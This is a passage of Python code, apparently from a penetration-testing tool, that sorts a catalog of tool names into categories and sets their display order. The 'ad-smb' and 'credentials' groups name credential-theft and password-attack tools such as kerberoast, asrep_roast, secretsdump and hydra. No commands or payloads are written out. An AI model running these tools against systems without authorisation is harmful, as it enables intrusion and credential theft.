    "ad-smb": ["netexec_smb", "netexec_winrm", "netexec_ldap", "enum4linux",
               "smbmap", "smbclient_shares", "ldapsearch_anon",
               "kerbrute_userenum", "asrep_roast", "kerberoast",
               "certipy_find", "bloodhound_python", "secretsdump"],
    "credentials": ["hydra"],
    "exploit": ["searchsploit"],
}
_NAME_TO_CATEGORY = {n: c for c, names in _CATEGORIES.items() for n in names}
for _spec in CATALOG:
    # Respect a category set explicitly on the spec; otherwise use the map.
    if _spec.category == "misc":
        _spec.category = _NAME_TO_CATEGORY.get(_spec.name, "misc")

# Display order for grouped output.
CATEGORY_ORDER = ["recon", "web", "ad-smb", "credentials", "exploit", "misc"]
